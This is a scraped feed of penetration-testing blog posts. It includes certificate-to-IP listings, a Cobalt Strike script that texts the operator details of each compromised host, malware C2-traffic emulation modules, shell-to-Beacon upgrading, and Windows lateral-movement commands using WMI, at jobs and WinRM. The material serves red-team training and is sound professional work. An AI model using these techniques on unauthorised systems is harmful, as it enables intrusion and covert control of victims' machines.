/>\ngZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAON7cva3kJQND6EKP5LH7SuHqAfq<br />\noYgjrWLoKIFQnESZm3exIbM8caQHCtfVXVtS5a26866jG35Ej6NDGxoH9TGnZUob<br />\nb1O32wj7A6CVs48EMCgL4h26a9wVmYu11lMw8CZCmL3sslDJuWemSm1wr3jV5lmQ<br />\nZDGT5ZJX2xK9SREZAgMBAAGjgc4wgcswCwYDVR0PBAQDAgGGMB0GA1UdDgQWBBQ1<br />\nCjPqq7qryz38LQCGO/yFR8I82TCBnAYDVR0jBIGUMIGRgBQ1CjPqq7qryz38LQCG<br />\nO/yFR8I82aFupGwwajELMAkGA1UEBhMCY24xCzAJBgNVBAgTAmdkMQswCQYDVQQH<br />\nEwJzejELMAkGA1UEChMCaHcxDDAKBgNVBAsTA25zZDELMAkGA1UEAxMCengxGTAX<br />\nBgkqhkiG9w0BCQEWCnp4QHRvbS5jb22CCQCTp3Zqdnt76TANBgkqhkiG9w0BAQUF<br />\nAAOBgQDcv0OCWGGqrUxQjfsqTNqrxmKF2oKGrmkl7ooWkfff0AcCHrRqYO5cqPy1<br />\nsP6y9JIhboUSpmxiZPSw/rjs24fRCQFX1FTXHBG1Y5HwWQD3ES4dsnteHMuhP0c5<br />\nYWQ30zFA+2fKreH4/LdkfZNI2D6mrrR0r/CTEX+YdiINgvAKCQ==<br />\n&#8212;&#8211;END CERTIFICATE&#8212;&#8211;</p>\n<p>****************************************************************<br />\nCertificate Chain is shared across the following IPs:<br />\n201.146.151.175<br />\n201.146.131.184</p>\n<p>&#8212;&#8211;BEGIN CERTIFICATE&#8212;&#8211;<br />\nMIIDIjCCAgoCCQCFUSb1q/UhozANBgkqhkiG9w0BAQUFADBSMQswCQYDVQQGEwJV<br />\nUzEOMAwGA1UECBMFRExJTksxCzAJBgNVBAcTAlVTMQ4wDAYDVQQKEwVETElOSzEW<br />\nMBQGA1UEAxMNMTkyLjE2OC4wLjEwMTAgFw0wODExMjYwOTMwNDZaGA8xOTM2MDcy<br />\nNjIwMzQxNFowUjELMAkGA1UEBhMCVVMxDjAMBgNVBAgTBURMSU5LMQswCQYDVQQH<br />\nEwJVUzEOMAwGA1UEChMFRExJTksxFjAUBgNVBAMTDTE5Mi4xNjguMC4xMDEwggEi<br />\nMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDGKzhJPWtVXy7yfBov58rHxnxx<br />\ncZVhYPp7JkeG8Xxw1VwhngBS5iyhIwgxyfBNZPoh2bcVslosfiAmfb1Yo5WdK0q2<br />\n6kCX31o5WmyD9JpHQL9h1KwVF4biURQzBMM4NH+3fFk2VNN2vcndFY+rgSCk860D<br />\nnSN+TqZ+GrVjgQPfM102QxIRLlUt73iFB9JEQABDRK2QmqoOWxYhIIaRNJnBITbc<br />\nQTGx82CNz/sgDo77jLCx9hNoBeotyP+vj1CWx9/kvNtRq21no7i+QIeCe4KNsMje<br />\nYpn4RI0FCoUp8GzFSu6iGptEz0PlN4hvom7HW6LpKFFGHf4PQ9CVLMwkMUXLAgMB<br />\nAAEwDQYJKoZIhvcNAQEFBQADggEBAJmy5NIaclQhq8/8RuF7AOQkNcR7AMrINC5v<br />\nbQDTKYIGuAtMamdZ3/S8y6fKDhbK6uYfABQ1dy9SQdJJIn5IRx5NHr9Z2cuU5hyU<br />\naT5aNQaKrE8tgd3tdRS485OGv8H2lviwC2qwo2wSny+Fh9150BSn/Gdiss8vrQyp<br />\njoRb+xLV1ZNxbZme3TUKmhIAdsbsImv9Psfzoy7yCJzSROzCKc08zGkJg7UcWiEt<br />\nF0Pu4WTuWdjzR0KW0z7Ee0/GokQSQLlNMys5jfoobIj/1B+zD3i0pVXPDoYKpZhS<br />\nHQYtdx/8nnb9ncG/oqqMMbfZKg0JxlzbLdQvXczEzQjn10CYAfk=<br />\n&#8212;&#8211;END CERTIFICATE&#8212;&#8211;</p>\n<p>****************************************************************<br />\nCertificate Chain is shared across the following IPs:<br />\n178.76.238.30</p>\n<p>&#8212;&#8211;BEGIN CERTIFICATE&#8212;&#8211;<br />\nMIIC3jCCAcagAwIBAgIQusJKgpI8fa5FnLxNuCfk4TANBgkqhkiG9w0BAQUFADAY<br />\nMRYwFAYDVQQDEw1TRVJWRVItQUxNQUlaMB4XDTEzMDMwMjE5MDE1OFoXDTIzMDMw<br />\nMjAwMDAwMFowGDEWMBQGA1UEAxMNU0VSVkVSLUFMTUFJWjCCASIwDQYJKoZIhvcN<br />\nAQEBBQADggEPADCCAQoCggEBANEXEmN/lk99huJz45NOmty1YUUJXHZAmo/HJchp<br />\nMctDPgMiKLGZHMYDRplzCDLyCqScRMIAkZzTnNQEmvqaOkhTAXGveCi7RHhVxpIA<br />\nWEIHf7vTnf95mLs2HXfVBgwyX4vrC3pREYvl28pi4bmTBH9+FWzoIpq+f83WZz3K<br />\n8bD3j1w8mJeRMxxVu5Lf1m/77vAZqiAHZTdKei1SGrvZOKTSiqqy5bhdbz5wpuMM<br />\nBj7LfpxOIcGUK0z2+JoYCDTpWfWdnd+JHRc1bWDqA5qe/4bey6DvCD+r7c47g+SM<br />\nGgzG0plyFhHtuaTLT+cM9bUVTdg3My1UCZYol2xZecTTGOUCAwEAAaMkMCIwCwYD<br />\nVR0PBAQDAgQwMBMGA1UdJQQMMAoGCCsGAQUFBwMBMA0GCSqGSIb3DQEBBQUAA4IB<br />\nAQCo4+YLmmjIdiWfXlKLn7psFsFVohAgzavx7aa+juD5zb092csjofu/RRljHOjc<br />\nPLesuuk7/RAbkDM1oV2WO5S02nRofu+8/SWSpitpirzM4fX0wuaKp/AZOmx+lEtk<br />\nTOv2m03Y5NSzr9y8sZth5lc/BGZRUi0A4UqSK93uXuSQijMG0HI3jnvflMIEflYP<br />\nxInE5u5MmWN9swHBsA/zRaDH4I50r4IWd8zEzESRJNco8hgVJxGnkjvYCU09KqyE<br />\nYDON7qFNOl6qjSVPWIkNCCKU+5T3pD8QIasWwmIwDqhkmNnfmSiwxF+iQNzi/Gc9<br />\njCAieWlxD4hWZRl8SqVEHAt2<br />\n&#8212;&#8211;END CERTIFICATE&#8212;&#8211;</p>\n<p>****************************************************************<br />\nCertificate Chain is shared across the following IPs:<br />\n181.48.78.18</p>\n<p>&#8212;&#8211;BEGIN CERTIFICATE&#8212;&#8211;<br />\nMIIC4jCCAcqgAwIBAgIE9TqY9zANBgkqhkiG9w0BAQUFADAzMRkwFwYDVQQDExBG<br />\nR1Q2MEMzRzEwMDEwNzE0MRYwFAYDVQQKEw1Gb3J0aW5ldCBMdGQuMB4XDTEyMDky<br />\nMDEyMTU1OVoXDTIyMDkyMTEyMTU1OVowMzEZMBcGA1UEAxMQRkdUNjBDM0cxMDAx<br />\nMDcxNDEWMBQGA1UEChMNRm9ydGluZXQgTHRkLjCCASIwDQYJKoZIhvcNAQEBBQAD<br />\nggEPADCCAQoCggEBAMCJoCOseHl1ploHbIOhAnqVgm2AAC4q3vINndoCEaO4MxVC<br />\n4MspYB2DYA6GcmgTnyEJiNamsn+SRdrdorzjEfmIKtPsYj1nUGPaGLg0SH2GB2KW<br />\nSEfI+iq1lhBr8QiET3UEfUgZ+B/MQ0DMMF1qqfAWXqTfdpei0DSoMCmHO8gB3wwC<br />\nvUXBHD6d4vf2J1Mz3XQujcEqcQHM2SUM3repURLQRWIB5WlwnTk15/UeGjGXsolo<br />\nCbuLsqsqhyrVySib2croNrO4ZBdZVb+SYAcE5897rpvZAOKUEfWuwHdsrOkIWjz2<br />\njU3TxJUlKuKyMEuoIwOZ9X6WQau0fKIcYvc4yaECAwEAATANBgkqhkiG9w0BAQUF<br />\nAAOCAQEAJA366S+MVVtgi/Tya+Nqe0hchPS8gKy4VJYjg2MkS55b7g0uS7Q46/k5<br />\nusW7mL+zALoWHoSpQi0q0pjxVIdHUVvzwYPl+pOWrChQHxkEi4UwmgYhIGz+l4fx<br />\nl/7vLhdXg671qXDgO9HhuzF7CpYcDOHTUV0X9m334LoUYrC/YNzDC7Xh+HAGbfQI<br />\n8G+B5OgjJIJZtCabeijpaqseUxXKg5C1yYSotR4h/99voyqdzmxi5rw2f/GrZTxB<br />\nKMJDSDHoO7iJ3VzKtnASDs9DDBf2lRg0SyHudzU8ovYexysyNWPV9BHKnbgbWB2v<br />\nB5TEevckVKWuk0zJhjfNIqQ32iBHlQ==<br />\n&#8212;&#8211;END CERTIFICATE&#8212;&#8211;</p>\n<p>****************************************************************<br />\nCertificate Chain is shared across the following IPs:<br />\n95.5.189.230</p>\n","descriptionType":"html","publishedDate":"Fri, 02 Oct 2015 01:08:23 +0000","feedId":11878,"bgimg":"","linkMd5":"fa46d4dafe14302de6c0b32ded87a50c","bgimgJsdelivr":"","metaImg":"","author":"Christopher Truncer","publishedOrCreatedDate":1598319666309},{"createdTime":"2020-08-25 09:41:06","updatedTime":"2020-08-25 09:41:06","title":"Receiving Text Messages for your Incoming Beacons","link":"https://www.christophertruncer.com/?p=1273","description":"<p>Whether it be through phishing, or some other means, waiting for your incoming beacons can be an anxious moment.  Every time I send off phishing e-mails, I anxiously await to receive the incoming beacons.  I personally want to know and be alerted the second that I receive a beacon, so I figured this would be a great time to work with <a href=\"https://twitter.com/armitagehacker\">Raphael Mudge&#8217;s</a> scripting language that&#8217;s built right into Cobalt Strike &#8211; <a href=\"https://www.cobaltstrike.com/aggressor-script/index.html\">Aggressor</a>.</p>\n<p>Aggressor is an event-driven language, very similar to scripts people may have developed for IRC.  One of the events built into Aggressor is &#8220;<a href=\"https://www.cobaltstrike.com/aggressor-script/events.html#beacon_initial\">beacon_initial</a>&#8220;.  This event is triggered when a beacon is established for the first time.  Using this event, you can have Cobalt Strike do &#8220;something&#8221; when a beacon first checks in.</p>\n<p>Aggressor is based on the language <a href=\"http://sleep.dashnine.org/\">Sleep</a> (also by Raphael Mudge) which supports an &#8220;<a href=\"http://sleep.dashnine.org/manual/exec.html\">exec</a>&#8221; function.  So to tie this all together, we can have Aggressor run a command when each new beacon first checks in.  Sounds like I can just write a script that texts me with some of the information I&#8217;m interested in receiving for each new beacon!</p>\n<p>The Aggressor script can be found <a href=\"https://github.com/ChrisTruncer/PenTestScripts/blob/master/text_aggressor.cna\">here</a>, so let&#8217;s go through this and learn what&#8217;s happening.</p>\n<pre class=\"brush: plain; title: ; notranslate\"> \non beacon_initial { \n    local('$computer');\n    local('$internal');\n    $computer = beacon_info($1, &#34;computer&#34;);\n    $internal = beacon_info($1, &#34;internal&#34;);\n    exec(&#34;/root/cobaltstrike/emailme.py --ip &#34; . $internal . &#34; --computer '&#34; . $computer . &#34;'&#34;);\n}\n</pre>\n<p>The &#8220;<a href=\"http://sleep.dashnine.org/manual/exec.html\">beacon_initial</a>&#8221; is the event that triggers when a beacon first checks in.  The &#8220;<a href=\"http://sleep.dashnine.org/manual/local.html\">local</a>&#8221; commands are used to declare the contained string as a local variable.  These will store the internal IP and computer name of the beacon that just checked in.  The &#8220;<a href=\"https://www.cobaltstrike.com/aggressor-script/functions.html#beacon_info\">beacon_info</a>&#8221; commands allows us to retrieve metadata about the incoming beacon, in this case the internal IP and computer name.  Finally, the &#8220;<a href=\"http://sleep.dashnine.org/manual/exec.html\">exec</a>&#8221; command executes the script at the location I&#8217;ve specified. Now, all that is needed is a script that sends the text messages!</p>\n<p>This can be easily done using Python, and I have a script <a href=\"https://github.com/ChrisTruncer/PenTestScripts/blob/master/beacontext.py\">here</a> that does it.</p>\n<pre class=\"brush: python; title: ; notranslate\">\n#!/usr/bin/env python\n\nimport argparse\nimport smtplib\nfrom email.MIMEMultipart import MIMEMultipart\nfrom email.MIMEText import MIMEText\n\nparser = argparse.ArgumentParser(description='beacon info')\nparser.add_argument('--computer')\nparser.add_argument('--ip')\nargs = parser.parse_args()\n\nfromaddr = &#34;&#34;\ntoaddr = [&#34;7777777777@txt.att.net&#34;, &#34;8888888888@vtext.com&#34;]\nmsg = MIMEMultipart()\nmsg['From'] = fromaddr\nmsg['To'] = &#34;, &#34;.join(toaddr)\nmsg['Subject'] = &#34;INCOMING BEACON&#34;\n\nhostname = args.computer\ninternal_ip = args.ip\n\nbody = &#34;Check your teamserver! \\nHostname - &#34; + hostname + &#34;\\nInternal IP - &#34; + internal_ip\nmsg.attach(MIMEText(body, 'plain'))\n\nserver = smtplib.SMTP('smtp.gmail.com', 587)\nserver.starttls()\nserver.login(fromaddr, &#34;&#34;)\ntext = msg.as_string()\nserver.sendmail(fromaddr, toaddr, text)\nserver.quit()\n</pre>\n<p>This script was modified from another script I found online. It uses gmail (you will need to provide a username and password) to send e-mails to addresses that you specify. In this case, it&#8217;s sends e-mails to the addresses for AT&#38;T and Verizon that translates e-mails to text messages (just change the phone numbers in the toad variable). Now, anytime that I receive an incoming beacon, this script is triggered and I receive a text message containing the hostname and internal ip of the compromised system!</p>\n<p>You can run this one of two ways. While connected to your team server, just load up the Script Console, load your script, and you&#8217;re good to go. However, this obviously requires you to stay connected to your team server. Your other option is to use the &#8220;agscript&#8221; binary that comes with Cobalt Strike. This program lets you connect to a team server and run a script, without requiring the Cobalt Strike client. An easy way to use this is to SSH to your team server, start a screen session, and run the agscript binary in the background with the above Aggressor script. Now, anytime you receive a beacon, your Aggressor script will trigger your e-mail script which texts you to notify you of the new beacon!</p>\n<p><img loading=\"lazy\" style=\"display: block; margin-left: auto; margin-right: auto;\" title=\"agscriptvid.gif\" src=\"https://www.christophertruncer.com/wp-content/uploads/2016/09/agscriptvid.gif\" alt=\"Agscriptvid\" width=\"\" height=\"\" border=\"0\" /></p>\n<p><img loading=\"lazy\" style=\"display: block; margin-left: auto; margin-right: auto;\" title=\"text.png\" src=\"https://www.christophertruncer.com/wp-content/uploads/2016/09/text-1.png\" alt=\"Text\" width=\"238\" height=\"136\" border=\"0\" /></p>\n","descriptionType":"html","publishedDate":"Tue, 13 Sep 2016 13:56:25 +0000","feedId":11878,"bgimg":"https://www.christophertruncer.com/wp-content/uploads/2016/09/agscriptvid.gif","linkMd5":"1afa9dab30b5a0cbf018ceb762df5247","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn99@2020_1/2020/08/25/01-41-31-952_5a83e67941230b90.webp","destWidth":960,"destHeight":600,"sourceBytes":5529394,"destBytes":1700900,"author":"Christopher Truncer","articleImgCdnMap":{"https://www.christophertruncer.com/wp-content/uploads/2016/09/agscriptvid.gif":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn99@2020_1/2020/08/25/01-41-31-952_5a83e67941230b90.webp","https://www.christophertruncer.com/wp-content/uploads/2016/09/text-1.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn55@2020_3/2020/08/25/01-41-33-851_5907653b7f35177e.webp"},"publishedOrCreatedDate":1598319666307},{"createdTime":"2020-08-25 09:41:06","updatedTime":"2020-08-25 09:41:06","title":"Egress-Assess Malware Modules","link":"https://www.christophertruncer.com/?p=1174","description":"<p>Github Link &#8211; <a href=\"https://github.com/ChrisTruncer/Egress-Assess\">https://github.com/ChrisTruncer/Egress-Assess</a></p>\n<p>Steve Borosh (<a href=\"https://twitter.com/424f424f\">@424f424f</a>) and <a href=\"https://twitter.com/christruncer\">I</a> have been working on adding a new type of module into Egress-Assess for a month or two now. Currently, <a href=\"https://github.com/ChrisTruncer/Egress-Assess\">Egress-Assess</a> lets you exfiltrate faux or <a href=\"https://www.christophertruncer.com/egress-assess-and-owning-file-data-exfiltration/\">real data</a> over a variety of different <a href=\"https://www.christophertruncer.com/exfiltrate-data-via-dns-with-egress-assess/\">protocols</a> on both Linux and <a href=\"https://www.christophertruncer.com/egress-assess-action-via-powershell/\">Windows</a> systems.  However, Steve had the idea to create malware modules for Egress-Assess, and we started working on it.</p>\n<p>A major resource that needs to be called out for really helping to push this idea forward is Raphael Mudge with the <a href=\"https://github.com/rsmudge/Malleable-C2-Profiles\">Malleable C2 Profiles</a> that he created for use with Beacon.  Props to him for adding an awesome capability for Beacon and helping to push the idea of hacking to get caught forward.</p>\n<p>We want to be able to allow users to use Egress-Assess to emulate known malware within any network.  We scoured the internet for various sources where companies have documented different network indicators used to identify malware operating over the network.  After a lot of research, we are happy to merge in the following malware modules into Egress-Assess:</p>\n<p><a href=\"https://www.christophertruncer.com/wp-content/uploads/2015/11/Egress-Assess-Supported-Malware.png\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1176\" src=\"https://www.christophertruncer.com/wp-content/uploads/2015/11/Egress-Assess-Supported-Malware.png\" alt=\"Egress-Assess Supported Malware\" width=\"1442\" height=\"371\" /></a></p>\n<ul>\n<li>Zeus</li>\n<li>Darkhotel</li>\n<li>etumbot</li>\n<li>putterpanda</li>\n</ul>\n<p>The various malware modules use known/documented C2 domains for the host headers (which are randomly selected from a large list of documented domains).  Additionally, if the malware being emulated is using GET/POST requests for C2 comms (which all currently included are), we are then also emulating the malware&#8217;s comms via each malware family&#8217;s respective method for communicating (custom uri parameters, post request data, etc.).</p>\n<p>Ideally, you should now have the ability to generate network traffic that conforms to the respective malware&#8217;s documented methodology for C2 comms (for which we have created a module).  If there are any requests for specific pieces of malware that you would like to see added into Egress-Assess, please get in touch with <a href=\"https://twitter.com/424f424f\">Steve</a> or <a href=\"https://twitter.com/christruncer\">myself</a> on twitter, e-mail, or create an <a href=\"https://github.com/ChrisTruncer/Egress-Assess/issues\">Issue on Github</a> and let us know what you would like added in.</p>\n","descriptionType":"html","publishedDate":"Mon, 16 Nov 2015 14:45:04 +0000","feedId":11878,"bgimg":"https://www.christophertruncer.com/wp-content/uploads/2015/11/Egress-Assess-Supported-Malware.png","linkMd5":"e3abfb85708b05c5c979cc6daf4d2bdb","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn95@2020_5/2020/08/25/01-41-06-786_844004cb768c9343.webp","destWidth":1442,"destHeight":371,"sourceBytes":31970,"destBytes":41192,"author":"Christopher Truncer","articleImgCdnMap":{"https://www.christophertruncer.com/wp-content/uploads/2015/11/Egress-Assess-Supported-Malware.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn95@2020_5/2020/08/25/01-41-06-786_844004cb768c9343.webp"},"publishedOrCreatedDate":1598319666308},{"createdTime":"2020-08-25 09:41:06","updatedTime":"2020-08-25 09:41:06","title":"Upgrading Your Shells to Beacons","link":"https://www.christophertruncer.com/?p=1161","description":"<p>It&#8217;s an issue we all encounter, we&#8217;re operating in a shell and want to upgrade it to something better. For many, this may be Meterpreter which is absolutely a valid choice. Another option I want to explore in this post is upgrading your shell to a Cobalt Strike Beacon.</p>\n<p>In this instance, I&#8217;m going to cheat by generating a shell callback with Veil-Evasion to simulate operating in a shell and executing it on a VM.</p>\n<p><img loading=\"lazy\" style=\"display: block; margin-left: auto; margin-right: auto;\" title=\"Shell Callback.png\" src=\"https://www.christophertruncer.com/wp-content/uploads/2015/09/Shell-Callback.png\" alt=\"Shell Callback\" width=\"595\" height=\"77\" border=\"0\" /></p>\n<p>Now that I have my shell, it&#8217;s time to look into upgrading this to something better! First, I&#8217;ll need to setup a Beacon listener within Cobalt Strike. This is pretty simple, just select the headphones icon on the top menu and you&#8217;ll be presented with the Listener tab. Just select the &#8220;Add&#8221; button at the bottom and configure your listener as you see fit.</p>\n<p><img loading=\"lazy\" style=\"display: block; margin-left: auto; margin-right: auto;\" title=\"Beacon Listener.png\" src=\"https://www.christophertruncer.com/wp-content/uploads/2015/09/Beacon-Listener.png\" alt=\"Beacon Listener\" width=\"356\" height=\"235\" border=\"0\" /></p>\n<p>Once you&#8217;ve created your listener, it&#8217;s time to prep for the shell upgrade. I prefer to use Cobalt Strike&#8217;s powershell web-delivery feature to upgrade my shell. To set this up, click the powershell icon on the top menu and configure the attack. In this case, I customized the uri to be &#8220;upgrade&#8221;, I am using the default port 80, and the listener that I want to utilize was pre-selected.</p>\n<p><img loading=\"lazy\" style=\"display: block; margin-left: auto; margin-right: auto;\" title=\"Powershell Web Delivery.png\" src=\"https://www.christophertruncer.com/wp-content/uploads/2015/09/Powershell-Web-Delivery.png\" alt=\"Powershell Web Delivery\" width=\"415\" height=\"231\" border=\"0\" /></p>\n<p>Now, just select launch, and you&#8217;ll be given the command that you can run on your victim machine.</p>\n<p><img loading=\"lazy\" style=\"display: block; margin-left: auto; margin-right: auto;\" title=\"Powershell One Liner.png\" src=\"https://www.christophertruncer.com/wp-content/uploads/2015/09/Powershell-One-Liner.png\" alt=\"Powershell One Liner\" width=\"598\" height=\"104\" border=\"0\" /></p>\n<p>All you need to do now is just copy and paste this command into your shell, and you should see your beacon calling back!</p>\n<p><img loading=\"lazy\" style=\"display: block; margin-left: auto; margin-right: auto;\" title=\"Beacon Callback.png\" src=\"https://www.christophertruncer.com/wp-content/uploads/2015/09/Beacon-Callback.png\" alt=\"Beacon Callback\" width=\"347\" height=\"600\" border=\"0\" /></p>\n<p>If you have any questions, be sure to let me know! Hop in #Veil on Freenode or hit me up on twitter <a href=\"https://twitter.com/christruncer\">@ChrisTruncer</a>.</p>\n","descriptionType":"html","publishedDate":"Mon, 28 Sep 2015 13:14:04 +0000","feedId":11878,"bgimg":"https://www.christophertruncer.com/wp-content/uploads/2015/09/Shell-Callback.png","linkMd5":"56bd369ffdd75773fc68cbd563833d50","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn8@2020_1/2020/08/25/01-41-07-469_7e1d2899c9da7bfb.webp","destWidth":1190,"destHeight":154,"sourceBytes":76997,"destBytes":22796,"author":"Christopher Truncer","articleImgCdnMap":{"https://www.christophertruncer.com/wp-content/uploads/2015/09/Shell-Callback.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn8@2020_1/2020/08/25/01-41-07-469_7e1d2899c9da7bfb.webp","https://www.christophertruncer.com/wp-content/uploads/2015/09/Beacon-Listener.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn35@2020_1/2020/08/25/01-41-33-853_f7d945412f641059.webp","https://www.christophertruncer.com/wp-content/uploads/2015/09/Powershell-Web-Delivery.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn32@2020_3/2020/08/25/01-41-34-557_7b424b96105528ab.webp","https://www.christophertruncer.com/wp-content/uploads/2015/09/Powershell-One-Liner.png":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn72@2020_3/2020/08/25/01-41-34-238_f185d577c2a77d6a.webp","https://www.christophertruncer.com/wp-content/uploads/2015/09/Beacon-Callback.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn60@2020_5/2020/08/25/01-41-33-934_34d7412656350589.webp"},"publishedOrCreatedDate":1598319666308},{"createdTime":"2020-08-25 09:41:06","updatedTime":"2020-08-25 09:41:06","title":"Built-In Lateral Movement Tools","link":"https://www.christophertruncer.com/?p=1208","description":"<p>I&#8217;m writing this post to hopefully help serve as a reference that documents multiple ways you can move laterally within a network.  There&#8217;s a bunch of different tools that are built right into Windows which help facilitate lateral movement, how kind of Microsoft :).  For now, lets start looking over our options.</p>\n<h2>WMI &#8211; Windows Management Instrumentation</h2>\n<p>WMI has become more and more prevalent to red teamers and hackers after <a href=\"https://twitter.com/mattifestation\">Matt Graeber</a> really helped bring out its usefulness at Blackhat.  WMI allows you to do so many different things that it would take multiple blog posts to document, however I&#8217;ll try to go over the useful things right now.  One thing to note: WMI for nearly all cases requires local administrative access on a system, so you will need to be running in the context of a user that has local admin access (or provide the credentials) on the system you are targeting.</p>\n<p>One of the classes that&#8217;s immediately useful is the Win32_Process class.  This allows us to create and run a process on a machine, local or remote.  I wrote a PowerShell tool called <a href=\"https://github.com/ChrisTruncer/WMIOps\">WMIOps</a> which easily allows you to use WMI to create a process on a remote system, such as powershell, or running any other command.  For example, lets say there was a system called &#8220;win7pdws2-pc&#8221; on the domain &#8220;sonofflynnlab&#8221; with a local admin username &#8220;test2&#8221; and password &#8220;P@ssword123&#8221;.  If you wanted to start &#8220;notepad.exe&#8221; on the remote system, you could use WMIOps and run:</p>\n<p><code>Invoke-ExecCommandWMI -User sonofflynnlab\\test2 -Pass P@ssword123 -Command notepad.exe -Targets win7pdws2-pc</code></p>\n<p><a href=\"https://www.christophertruncer.com/wp-content/uploads/2015/12/wmiexec.png\"><img loading=\"lazy\" class=\"size-full wp-image-1210\" src=\"https://www.christophertruncer.com/wp-content/uploads/2015/12/wmiexec.png\" alt=\"Start processes on a remote system using WMI\" width=\"640\" height=\"197\" /></a></p>\n<p>This command will start notepad.exe on the testwinpc, and you have remote code execution!   The ReturnValue of &#8220;0&#8221; lets us know that it executed successfully.  On our target system, we can see notepad.exe is running.</p>\n<p><a href=\"https://www.christophertruncer.com/wp-content/uploads/2015/12/notepadrunning.png\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1211\" src=\"https://www.christophertruncer.com/wp-content/uploads/2015/12/notepadrunning.png\" alt=\"notepadrunning\" width=\"409\" height=\"457\" /></a></p>\n<p>This is useful when you may not be able to access a system over SMB, but you can using WMI.  Also, WMI is generally a sneakier way (at the moment) of executing code on remote systems as you are not having to drop anything to disk.</p>\n<h2>At Jobs</h2>\n<p>At jobs are way to schedule and start a process on a remote system.  Similar to WMI, you will need local administrative rights on the system in order to schedule an at job.  To schedule an at job, at a minimum you will need to provide the path to the file you want to run and the time you want the process started.  So lets get the current time on the remote system, to do this, just run:</p>\n<p><code>net time \\\\&#60;computername&#62;</code></p>\n<p><a href=\"https://www.christophertruncer.com/wp-content/uploads/2015/12/nettime.png\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1212\" src=\"https://www.christophertruncer.com/wp-content/uploads/2015/12/nettime.png\" alt=\"nettime\" width=\"451\" height=\"65\" /></a></p>\n<p>Since the current time on the target system is 11:50 AM, lets schedule a job to run about 3 minutes in the future.  In this example, I want to start notepad.exe on the target system.  To schedule this job, I can just run the following:</p>\n<p><code>at \\\\win7pdws2-pc 11:53 notepad.exe</code></p>\n<p><a href=\"https://www.christophertruncer.com/wp-content/uploads/2015/12/atjobcli.png\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1213\" src=\"https://www.christophertruncer.com/wp-content/uploads/2015/12/atjobcli.png\" alt=\"atjobcli\" width=\"449\" height=\"39\" /></a></p>\n<p>I can see that my job is job number 2 for this system.  Now, when the system hits 11:53 AM, it will run the notepad.exe process.  One key difference between using at jobs and WMI is WMI runs in the context of the account you provided.  At jobs run as system.</p>\n<p><a href=\"https://www.christophertruncer.com/wp-content/uploads/2015/12/atjobrunning.png\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1214\" src=\"https://www.christophertruncer.com/wp-content/uploads/2015/12/atjobrunning.png\" alt=\"atjobrunning\" width=\"409\" height=\"457\" /></a></p>\n<p>You can also use WMI to schedule jobs on a remote system.  WMIOps allows you to easily list, delete, and create jobs on a remote system.  So, lets say you wanted to use WMIOps to create a job at 12:18 to start notepad.exe.  You would run the following command:</p>\n<p><code>Invoke-SchedJobManipulation -User sonofflynnlab\\test2 -Pass P@ssword123 -Targets win7pdws2-pc -Create notepad.exe -Time 12:18</code></p>\n<p><a href=\"https://www.christophertruncer.com/wp-content/uploads/2015/12/wmiopsjobschedule.png\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1216\" src=\"https://www.christophertruncer.com/wp-content/uploads/2015/12/wmiopsjobschedule.png\" alt=\"wmiopsjobschedule\" width=\"641\" height=\"204\" /></a></p>\n<p>Creating the job was successful, and we can see our job was assigned JobID 3.</p>\n<h2>Powershell Remoting</h2>\n<p>WinRM is a very nifty way to execute PowerShell code on a remote system.  As with the previous options, it will require that you have local administrative rights on the system you are targeting.</p>\n<p>If WinRM is enabled on the system you are targeting, you can execute PowerShell commands on the target, giving you the flexibility of PowerShell.  The ports that you would probably see WinRM listening on is 5985 (http), or 5986 (https) (<a href=\"https://support.microsoft.com/en-us/kb/2019527\">source</a>).</p>\n<p>To use WinRM to run a program/execute code on your target system, you could use the Invoke-Command cmdlet:</p>\n<p><code>Invoke-Command -ComputerName win7pdws2-pc -ScriptBlock { hostname }</code></p>\n<p><code>Invoke-Command -ComputerName win7pdws2-pc -ScriptBlock { ping 8.8.8.8 }</code></p>\n<p><a href=\"https://www.christophertruncer.com/wp-content/uploads/2015/12/winrm.png\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1218\" src=\"https://www.christophertruncer.com/wp-content/uploads/2015/12/winrm.png\" alt=\"winrm\" width=\"643\" height=\"210\" /></a></p>\n<p>Raphael Mudge has a <a href=\"http://blog.cobaltstrike.com/2015/07/22/winrm-is-my-remote-access-tool/\">great post</a> on using WinRM.  Be sure to check it out!</p>\n<h2>Remote Desktop</h2>\n<p>I don&#8217;t think I really need to go into any sort of description for this :).  Remote desktop is useful on servers where you can connect remotely without interrupting a users session.  RDPing into someone&#8217;s workstation can cause issues, and can be easily detected.  I wouldn&#8217;t recommend RDPing into a workstation unless it&#8217;s not being used at all.</p>\n<p>Still want to try to RDP in?  WMIOps also has a function called Find-ActiveUsersWMI.  When you point this function at a workstation, it will attempt to see if LogonUI.exe or a *.scr (screensaver) process is running.  If either are running, it will let you know the user is likely not at their workstation.  If neither are, they probably are there!  To check, just use:</p>\n<p><code>Find-ActiveUsersWMI -User sonofflynnlab\\test2 -Pass P@ssword123 -Targets winypdws2-pc</code></p>\n<p><a href=\"https://www.christophertruncer.com/wp-content/uploads/2015/12/usersactivecheck.png\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1219\" src=\"https://www.christophertruncer.com/wp-content/uploads/2015/12/usersactivecheck.png\" alt=\"usersactivecheck\" width=\"642\" height=\"89\" /></a></p>\n<p>&#160;</p>\n<p>I hope this helps to document a couple of tools built into Windows which helps to facilitate lateral movement within a network.  By no means is this an all-inclusive list, but a start.  If there&#8217;s something else you think is worth calling out in this post, please be sure to let me 